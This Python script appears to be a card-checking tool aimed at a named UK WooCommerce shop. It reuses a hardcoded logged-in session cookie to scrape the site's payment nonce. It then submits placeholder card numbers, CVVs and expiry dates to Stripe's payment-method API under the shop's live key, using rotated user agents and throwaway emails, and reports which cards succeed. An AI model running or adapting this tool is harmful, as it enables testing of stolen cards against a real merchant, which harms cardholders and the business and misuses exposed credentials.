import requests
import random
import string
import uuid

# Function to generate a random User-Agent
def get_random_ua():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
    ]
    return random.choice(user_agents)

# Function to generate a random number within a range
def generate_random_num(start, end):
    return str(random.randint(start, end))

# Function to generate a random email
def generate_random_email():
    email = "salamhunter_" + ''.join(random.choices(string.ascii_lowercase, k=7)) + "@gmail.com"
    return email

# Function to generate a random username
def generate_random_username():
    username = "salamhunter_" + ''.join(random.choices(string.ascii_lowercase, k=7))
    return username

# Function to generate a GUID
def generate_guid():
    return str(uuid.uuid4())

# Function to make a GET request to a URL
def get_request(url, headers):
    response = requests.get(url, headers=headers)
    response.raise_for_status()
    return response.text

# Function to parse a value from the response using left and right delimiters
def parse_value(source, left_delim, right_delim):
    start = source.find(left_delim) + len(left_delim)
    end = source.find(right_delim, start)
    return source[start:end]

# Function to make a POST request to a URL
def post_request(url, headers, data):
    response = requests.post(url, headers=headers, data=data)
    response.raise_for_status()
    return response.json()

# Main script logic
def main():
    # Generate random values
    user_agent = get_random_ua()
    time = generate_random_num(111111, 999999)
    email = generate_random_email()
    username = generate_random_username()
    guid = generate_guid()
    muid = generate_guid()
    sid = generate_guid()

    # Set headers for GET request
    headers_get = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "cookie": "sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-13%2019%3A40%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.dalewooddesignsgb.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-13%2019%3A40%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.dalewooddesignsgb.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; _ga=GA1.1.276418291.1734118808; store_noticef10d9103dc454c98eadb1bc96bdb1eec=hidden; wordpress_logged_in_a4cb4cdb8c949ef92a22e0de393c242e=salamhunter5%7C1735328424%7CxxVAjcZBXJvuh44cg12Aj4gaI0VOlo23FoRtdj8hRbQ%7Cc9bdc33bb845fd3a49f7aaccef13b49f84284d5847141a39df7724abfc61d13c; _ga_NVPRDJWH8N=GS1.1.1734118807.1.1.1734118827.0.0.0; tk_ai=PJcU8QclubhHropqZjLXIOIA; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.dalewooddesignsgb.co.uk%2Fmy-account%2Fpayment-methods%2F; _ga_HVCBCS8F7X=GS1.1.1734118807.1.1.1734118931.53.0.0; tk_qs=",
        "pragma": "no-cache",
        "priority": "u=0, i",
        "referer": "https://www.dalewooddesignsgb.co.uk/my-account/payment-methods/",
        "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": user_agent
    }

    # Make GET request
    response_text = get_request("https://www.dalewooddesignsgb.co.uk/my-account/add-payment-method/", headers_get)
    nonce = parse_value(response_text, "add_card_nonce\":\"", "\",\"")

    # Set headers for POST request
    headers_post = {
        "User-Agent": user_agent,
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data_post = {
        "type": "card",
        "billing_details[name]": "+",
        "billing_details[email]": email,
        "card[number]": "<cc>",
        "card[cvc]": "<cvv>",
        "card[exp_month]": "<mes>",
        "card[exp_year]": "<ano>",
        "guid": "NA",
        "muid": "NA",
        "sid": "NA",
        "payment_user_agent": "stripe.js/553bf605c2; stripe-js-v3/553bf605c2; split-card-element",
        "referrer": "https://www.dalewooddesignsgb.co.uk",
        "time_on_page": time,
        "key": "pk_live_8AOKNZetuMq5MDbq6uKUyjDM"
    }

    # Make POST request
    response_json = post_request("https://api.stripe.com/v1/payment_methods", headers_post, data_post)

    # Parse response and handle success/failure
    if "id" in response_json:
        id_value = response_json["id"]
        print("Payment successful, ID:", id_value)
    else:
        print("Payment failed, response:", response_json)

if __name__ == "__main__":
    main()
